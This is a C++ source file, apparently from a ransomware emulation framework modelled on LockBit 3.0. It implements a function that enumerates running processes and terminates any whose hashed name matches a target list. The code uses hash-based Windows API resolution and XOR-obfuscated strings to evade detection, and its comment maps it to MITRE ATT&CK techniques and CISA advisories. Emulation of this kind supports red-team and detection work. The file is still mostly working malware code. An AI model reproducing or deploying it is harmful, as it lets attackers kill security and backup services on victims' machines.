#include "crypto/djb2.hpp"
#include "crypto/xor_obfuscation.hpp"
#include "tamper.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"
#include <algorithm>
#include <stdexcept>
#include <format>

namespace tamper {

/*
 * KillProcesses:
 *      About:
 *          Enumerates processes on the local system and terminates any that are included in the
 *          process_names vector. 
 *          Relevant API calls:
 *              CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, 
 *              OpenProcess, TerminateProcess
 *      Result:
 *          Terminated processes
 *      MITRE ATT&CK Techniques:
 *          T1489: Service Stop
 *          T1057: Process Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165
 *          https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf
 *      Other References:
 *          https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
 */
void KillProcesses(const std::set<unsigned long>& hashed_process_names) {
    DWORD error_code;
    FP_CreateToolhelp32Snapshot createToolhelp32Snapshot = (FP_CreateToolhelp32Snapshot)winapi_helper::GetAPI(0x66851295, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (createToolhelp32Snapshot == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for CreateToolhelp32Snapshot. Error code"), error_code));
        return;
    }
    FP_Process32FirstW process32FirstW = (FP_Process32FirstW)winapi_helper::GetAPI(0xe18fc6e8, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (process32FirstW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for Process32FirstW. Error code"), error_code));
        return;
    }
    FP_OpenProcess openProcess = (FP_OpenProcess)winapi_helper::GetAPI(0x7136fdd6, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (openProcess == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for OpenProcess. Error code"), error_code));
        return;
    }
    FP_Process32NextW process32NextW = (FP_Process32NextW)winapi_helper::GetAPI(0x9307647f, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (process32NextW == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for Process32NextW. Error code"), error_code));
        return;
    }

    HANDLE h_snapshot = createToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    HANDLE h_proc = NULL;
    XorLogger::LogDebug(XOR_LIT("Enumerating processes to terminate."));
    if (h_snapshot == INVALID_HANDLE_VALUE) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("CreateToolhelp32Snapshot failed with error code"), GetLastError()));
        return;
    }
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!process32FirstW(h_snapshot, &pe32)) {
        error_code = GetLastError();
        CloseHandle(h_snapshot);
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Process32First failed with error code"), error_code));
        return;
    }
    do {
        std::wstring file_ext = L".exe";
        if (std::wstring(pe32.szExeFile).find(L".bin") != std::string::npos) {
            file_ext = L".bin";
        }
        std::wstring proc_name = string_util::trim_suffix(std::wstring(pe32.szExeFile), file_ext);
        std::string proc_name_narrow = string_util::wstring_to_string(proc_name);
        unsigned long hashed_proc_name = djb2::djb2_case_insensitive(proc_name_narrow.c_str());
        if (hashed_process_names.contains(hashed_proc_name)) {
            // Kill target process
            h_proc = openProcess(PROCESS_TERMINATE, false, pe32.th32ProcessID);
            if (h_proc == NULL) {
                XorLogger::LogError(std::format(
                    "{} {} ({} {}) with error code: {}",
                    XOR_LIT("OpenProcess failed for process"),
                    proc_name_narrow,
                    XOR_LIT("PID"),
                    pe32.th32ProcessID,
                    GetLastError()
                ));
            } else {
                if (TerminateProcess(h_proc, 9)) {
                    XorLogger::LogInfo(std::format(
                        "{} {} {} {}",
                        XOR_LIT("Terminated process"),
                        proc_name_narrow,
                        XOR_LIT("with PID"),
                        pe32.th32ProcessID
                    ));
                } else {
                    XorLogger::LogError(std::format(
                        "{} {} ({} {}) with error code: {}", 
                        XOR_LIT("TerminateProcess failed for process"),
                        proc_name_narrow,
                        XOR_LIT("PID"),
                        pe32.th32ProcessID,
                        GetLastError()
                    ));
                }
                CloseHandle(h_proc);
            }
        }
    } while (process32NextW(h_snapshot, &pe32));
    error_code = GetLastError();
    CloseHandle(h_snapshot);
    if (error_code != ERROR_NO_MORE_FILES) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Process32Next failed with error code"), error_code));
    }
    XorLogger::LogDebug(XOR_LIT("Finished terminating processes."));
}

} // namespace